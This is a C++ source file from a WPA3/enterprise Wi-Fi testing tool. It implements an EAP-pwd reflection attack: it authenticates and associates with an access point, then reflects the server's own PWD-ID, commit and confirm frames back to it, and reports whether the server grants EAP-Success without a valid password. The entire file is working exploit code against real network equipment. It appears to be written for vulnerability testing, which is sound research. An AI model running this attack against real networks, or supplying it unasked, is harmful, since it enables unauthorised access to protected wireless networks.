#include "attacks/Enterprise/eap_pwd_reflection.h"

#include <chrono>
#include <tins/llc.h>
#include <tins/rawpdu.h>
#include "attacks/components/sniffer_helper.h"
#include "logger/log.h"

namespace wpa3_tester::reflection {
using namespace std;
using namespace chrono;
using namespace Tins;

// -----------------
// EAPOL byte layout (after SNAP has been stripped):
//   [0]   EAPOL version
//   [1]   EAPOL type (0x00 = EAP packet)
//   [2-3] body length   (big-endian)
//   [4]   EAP code      (1=Request 2=Response 3=Success 4=Failure)
//   [5]   EAP identifier
//   [6-7] EAP length    (big-endian, includes code/id/length itself)
//   [8]   EAP type      (1=Identity  52=PWD)
//   [9]   PWD-Exch byte (L|M|opcode) – only when type=52
//   [10+] PWD data (if L bit set: [10-11]=total_length first)

static constexpr size_t EAPOL_HDR = 4;  // version+type+len(2)
static constexpr size_t EAP_HDR   = 4;  // code+id+len(2)
static constexpr size_t EAP_TYPE_OFF = EAPOL_HDR + EAP_HDR; // offset of EAP type byte
static constexpr size_t PWD_EXCH_OFF = EAP_TYPE_OFF + 1;    // offset of PWD-Exch byte
static constexpr size_t PWD_DATA_OFF = PWD_EXCH_OFF + 1;    // offset of PWD payload

optional<EapPwdFrame> parse_eap_pwd(const vector<uint8_t>& eapol){
    if(eapol.size() <= PWD_EXCH_OFF) return nullopt;
    if(eapol[1] != 0x00)             return nullopt; // not EAP packet
    if(eapol[EAPOL_HDR] != EAP_REQUEST)  return nullopt;
    if(eapol[EAP_TYPE_OFF] != EAP_TYPE_PWD) return nullopt;

    EapPwdFrame f;
    f.eap_id = eapol[EAPOL_HDR + 1];
    const uint8_t exch = eapol[PWD_EXCH_OFF];
    f.opcode = exch & 0x3f;
    const bool L_bit = (exch >> 7) & 1;

    const size_t data_start = L_bit ? PWD_DATA_OFF + 2 : PWD_DATA_OFF;
    if(eapol.size() < data_start) return nullopt;
    f.pwd_data.assign(eapol.begin() + static_cast<ptrdiff_t>(data_start), eapol.end());
    return f;
}

bool is_identity_request(const vector<uint8_t>& eapol, uint8_t& out_eap_id){
    if(eapol.size() < EAP_TYPE_OFF + 1) return false;
    if(eapol[1] != 0x00)                return false;
    if(eapol[EAPOL_HDR] != EAP_REQUEST) return false;
    if(eapol[EAP_TYPE_OFF] != EAP_TYPE_IDENTITY) return false;
    out_eap_id = eapol[EAPOL_HDR + 1];
    return true;
}

bool is_eap_success(const vector<uint8_t>& eapol){
    if(eapol.size() < EAPOL_HDR + EAP_HDR) return false;
    if(eapol[1] != 0x00)                    return false;
    return eapol[EAPOL_HDR] == EAP_SUCCESS;
}

static vector<uint8_t> build_eapol_eap(const uint8_t code, uint8_t eap_id,
                                        const vector<uint8_t>& eap_body){
    // eap_body = everything after code/id/length (type byte onwards)
    const auto eap_len  = static_cast<uint16_t>(EAP_HDR + eap_body.size());
    const uint16_t eapol_len = eap_len;

    vector<uint8_t> out;
    out.reserve(EAPOL_HDR + eap_len);
    out.push_back(0x01);                            // EAPOL version
    out.push_back(0x00);                            // EAPOL type: EAP
    out.push_back(static_cast<uint8_t>(eapol_len >> 8));
    out.push_back(static_cast<uint8_t>(eapol_len & 0xff));
    out.push_back(code);                            // EAP code
    out.push_back(eap_id);                          // EAP id
    out.push_back(static_cast<uint8_t>(eap_len >> 8));
    out.push_back(static_cast<uint8_t>(eap_len & 0xff));
    out.insert(out.end(), eap_body.begin(), eap_body.end());
    return out;
}

vector<uint8_t> build_identity_response(const uint8_t eap_id, const string_view identity){
    vector<uint8_t> body;
    body.push_back(EAP_TYPE_IDENTITY);
    body.insert(body.end(), identity.begin(), identity.end());
    return build_eapol_eap(EAP_RESPONSE, eap_id, body);
}

vector<uint8_t> build_pwd_id_response(const EapPwdFrame& request, string_view peer_identity){
    // PWD-ID data: Group(2) + RF(1) + PRF(1) + Token(4) + Prep(1) = 9 bytes fixed prefix
    constexpr size_t FIXED = 9;
    vector<uint8_t> body;
    body.push_back(EAP_TYPE_PWD);
    body.push_back(PWD_OPCODE_ID); // PWD-Exch flags (opcode=1, no L/M)
    // echo fixed prefix
    const size_t copy_len = min(FIXED, request.pwd_data.size());
    body.insert(body.end(), request.pwd_data.begin(),
                            request.pwd_data.begin() + static_cast<ptrdiff_t>(copy_len));
    // peer identity instead of server identity
    body.insert(body.end(), peer_identity.begin(), peer_identity.end());
    return build_eapol_eap(EAP_RESPONSE, request.eap_id, body);
}

// Shared helper for commit and confirm: both just flip code to Response, keep data.
static vector<uint8_t> reflect_pwd_frame(const EapPwdFrame& request, uint8_t opcode){
    vector<uint8_t> body;
    body.push_back(EAP_TYPE_PWD);
    body.push_back(opcode); // same opcode, no L/M bits
    body.insert(body.end(), request.pwd_data.begin(), request.pwd_data.end());
    return build_eapol_eap(EAP_RESPONSE, request.eap_id, body);
}

vector<uint8_t> reflect_commit(const EapPwdFrame& request){
	// Group 19 (P-256): scalar(32) + element(64) = 96 bytes – just reflect verbatim
	return reflect_pwd_frame(request, PWD_OPCODE_COMMIT);
}

vector<uint8_t> reflect_confirm(const EapPwdFrame& request){
	// Group 19: confirm(32) – reflect verbatim
	return reflect_pwd_frame(request, PWD_OPCODE_CONFIRM);
}

bool do_auth(MonitorSocket& sock, const Channel& ch,
			const HWAddress<6>& our_mac, const HWAddress<6>& ap_mac, const milliseconds timeout){
	Dot11Authentication auth;
	auth.addr1(ap_mac);
	auth.addr2(our_mac);
	auth.addr3(ap_mac);
	auth.auth_algorithm(0);      // Open System
	auth.auth_seq_number(1);
	auth.status_code(0);

	RadioTap rt{};
	rt.inner_pdu(auth);
	sock.send(rt, ch);

	bool ok = false;
	(void)components::poll_sniffer<bool>(sock.get_pcap_handle(), timeout,
		[&](const u_char* p, const uint32_t caplen) -> optional<bool> {
			auto [pdu, raw] = MonitorSocket::parse_frame(p, caplen);
			if(!pdu) return nullopt;
			const auto* resp = pdu->find_pdu<Dot11Authentication>();
			if(!resp) return nullopt;
			log(LogLevel::DEBUG, "Auth frame: addr1={} addr2={} seq={} status={}",
				resp->addr1().to_string(), resp->addr2().to_string(),
				static_cast<int>(resp->auth_seq_number()),
				static_cast<int>(resp->status_code()));
			if(resp->addr1() != our_mac || resp->auth_seq_number() != 2) return nullopt;
			if(resp->status_code() != 0){
				log(LogLevel::WARNING, "Auth rejected, status={:d}", resp->status_code());
				return true;
			}
			ok = true;
			log(LogLevel::INFO, "802.11 Authentication OK");
			return true;
		});
	if(!ok) log(LogLevel::WARNING, "Auth timeout");
	return ok;
}

bool do_assoc(MonitorSocket& sock, const Channel& ch,
			const HWAddress<6>& our_mac, const HWAddress<6>& ap_mac,
			const string_view ssid, const milliseconds timeout){
	// RSN IE for WPA2 / 802.1X (AKM=1, pairwise=CCMP, group=CCMP)
	static const vector<uint8_t> rsn_ie = {
		0x01, 0x00,             // version 1
		0x00, 0x0f, 0xac, 0x04, // group cipher: CCMP
		0x01, 0x00,             // pairwise count: 1
		0x00, 0x0f, 0xac, 0x04, // pairwise: CCMP
		0x01, 0x00,             // AKM count: 1
		0x00, 0x0f, 0xac, 0x01, // AKM: 802.1X
		0x00, 0x00              // RSN capabilities
	};

	Dot11AssocRequest assoc;
	assoc.addr1(ap_mac);
	assoc.addr2(our_mac);
	assoc.addr3(ap_mac);
	assoc.capabilities().ess(true);
	assoc.capabilities().short_preamble(true);
	assoc.capabilities().sst(true);
	assoc.listen_interval(10);
	assoc.add_option(
		{Dot11::SSID,static_cast<uint32_t>(ssid.size()), reinterpret_cast<const uint8_t*>(ssid.data())});
	static const uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
	assoc.add_option({Dot11::SUPPORTED_RATES, sizeof(rates), rates});
	assoc.add_option({Dot11::RSN, static_cast<uint32_t>(rsn_ie.size()), rsn_ie.data()});

	sock.send(assoc, ch);

	bool ok = false;
	(void)components::poll_sniffer<bool>(sock.get_pcap_handle(), timeout,
		[&](const u_char* p, const uint32_t caplen) -> optional<bool> {
			auto [pdu, raw] = MonitorSocket::parse_frame(p, caplen);
			if(!pdu) return nullopt;
			const auto* resp = pdu->find_pdu<Dot11AssocResponse>();
			if(!resp || resp->addr1() != our_mac) return nullopt;
			if(resp->status_code() != 0){
				log(LogLevel::WARNING, "Assoc rejected, status={}", resp->status_code());
				return true;
			}
			ok = true;
			log(LogLevel::INFO, "802.11 Association OK");
			return true;
		});
	if(!ok) log(LogLevel::WARNING, "Assoc timeout");
	return ok;
}

void send_eapol(MonitorSocket& sock, const Channel& ch,
				const HWAddress<6>& our_mac, const HWAddress<6>& ap_mac,
				const vector<uint8_t>& eapol){
	// SNAP OUI(3) + EtherType(2) – same pattern as malformed_eapol1
	vector<uint8_t> snap_eapol = {0x00, 0x00, 0x00, 0x88, 0x8e};
	snap_eapol.insert(snap_eapol.end(), eapol.begin(), eapol.end());

	LLC llc(0xAA, 0xAA);
	llc.inner_pdu(RawPDU(snap_eapol));
	llc.type(LLC::UNNUMBERED);
	llc.modifier_function(LLC::UI);

	Dot11Data dot11;
	dot11.addr1(ap_mac);
	dot11.addr2(our_mac);
	dot11.addr3(ap_mac);
	dot11.to_ds(1);
	dot11.from_ds(0);
	dot11.inner_pdu(llc);

	sock.send(dot11, ch);
}

vector<uint8_t> extract_eapol(const PDU& pdu, const HWAddress<6>& our_mac){
	const auto* d11 = pdu.find_pdu<Dot11Data>();
	const auto* llc_pdu = pdu.find_pdu<LLC>();
	const auto* raw = pdu.find_pdu<RawPDU>();
	if(!d11 || !llc_pdu || !raw) return {};
	// must be addressed to us (addr1) or broadcast
	if(d11->addr1() != our_mac && d11->addr1() != HWAddress<6>::broadcast) return {};

	const auto& payload = raw->payload();
	// skip SNAP header (5 bytes: OUI 3 + EtherType 2)
	if(payload.size() < 5) return {};
	if(payload[3] != 0x88 || payload[4] != 0x8e) return {};
	return {payload.begin() + 5, payload.end()};
}

bool run_reflection_exchange(MonitorSocket& sock, const Channel& channel,
							const HWAddress<6>& our_mac, const HWAddress<6>& ap_mac,
							const string_view ssid, const string_view identity,
							const seconds timeout){
	const milliseconds step_ms{3000};

	if(!do_auth(sock, channel, our_mac, ap_mac, step_ms))  return false;
	if(!do_assoc(sock, channel, our_mac, ap_mac, ssid, step_ms)) return false;

	pcap_t* handle = sock.get_pcap_handle();
	const auto deadline = steady_clock::now() + timeout;

	auto remaining = [&]() -> milliseconds {
		return duration_cast<milliseconds>(deadline - steady_clock::now());
	};

	// Poll for an EAPOL frame satisfying pred, or EAP-Success (returned as empty vector).
	// Returns nullopt on timeout or interrupt.
	auto wait_eapol = [&](auto pred) -> optional<vector<uint8_t>> {
		optional<vector<uint8_t>> result;
		(void)components::poll_sniffer<bool>(handle, remaining(),
			[&](const u_char* p, const uint32_t caplen) -> optional<bool> {
				auto [pdu, raw] = MonitorSocket::parse_frame(p, caplen);
				if(!pdu) return nullopt;
				auto eapol = extract_eapol(*pdu, our_mac);
				if(eapol.empty()) return nullopt;
				if(is_eap_success(eapol)){ result = vector<uint8_t>{}; return true; }
				if(!pred(eapol)) return nullopt;
				result = move(eapol);
				return true;
			});
		return result;
	};

	// IDENTITY
	{
		uint8_t eap_id = 0;
		const auto eapol = wait_eapol([&](const vector<uint8_t>& e){ return is_identity_request(e, eap_id); });
		if(!eapol){ log(LogLevel::WARNING, "Reflection exchange ended without EAP-Success"); return false; }
		if(eapol->empty()){ log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!"); return true; }
		log(LogLevel::INFO, "EAP-Identity Request id={}", static_cast<unsigned>(eap_id));
		send_eapol(sock, channel, our_mac, ap_mac, build_identity_response(eap_id, identity));
	}

	// PWD-ID
	{
		optional<EapPwdFrame> frame;
		const auto eapol = wait_eapol([&](const vector<uint8_t>& e){
			const auto f = parse_eap_pwd(e);
			if(f && f->opcode == PWD_OPCODE_ID){ frame = f; return true; }
			return false;
		});
		if(!eapol){ log(LogLevel::WARNING, "Reflection exchange ended without EAP-Success"); return false; }
		if(eapol->empty()){ log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!"); return true; }
		log(LogLevel::INFO, "EAP-PWD-ID Request");
		send_eapol(sock, channel, our_mac, ap_mac, build_pwd_id_response(*frame, identity));
	}

	// COMMIT
	{
		optional<EapPwdFrame> frame;
		const auto eapol = wait_eapol([&](const vector<uint8_t>& e){
			auto f = parse_eap_pwd(e);
			if(f && f->opcode == PWD_OPCODE_COMMIT){ frame = f; return true; }
			return false;
		});
		if(!eapol){ log(LogLevel::WARNING, "Reflection exchange ended without EAP-Success"); return false; }
		if(eapol->empty()){ log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!"); return true; }
		log(LogLevel::INFO, "EAP-PWD-Commit Request – reflecting scalar+element");
		send_eapol(sock, channel, our_mac, ap_mac, reflect_commit(*frame));
	}

	// CONFIRM
	{
		optional<EapPwdFrame> frame;
		const auto eapol = wait_eapol([&](const vector<uint8_t>& e){
			const auto f = parse_eap_pwd(e);
			if(f && f->opcode == PWD_OPCODE_CONFIRM){ frame = f; return true; }
			return false;
		});
		if(!eapol){ log(LogLevel::WARNING, "Reflection exchange ended without EAP-Success"); return false; }
		if(eapol->empty()){ log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!"); return true; }
		log(LogLevel::INFO, "EAP-PWD-Confirm Request – reflecting confirm value");
		send_eapol(sock, channel, our_mac, ap_mac, reflect_confirm(*frame));
	}

	// Wait for EAP-Success after confirm
	{
		const auto eapol = wait_eapol([](const vector<uint8_t>&){ return false; });
		if(eapol && eapol->empty()){
			log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!");
			return true;
		}
	}

	log(LogLevel::WARNING, "Reflection exchange ended without EAP-Success");
	return false;
}

}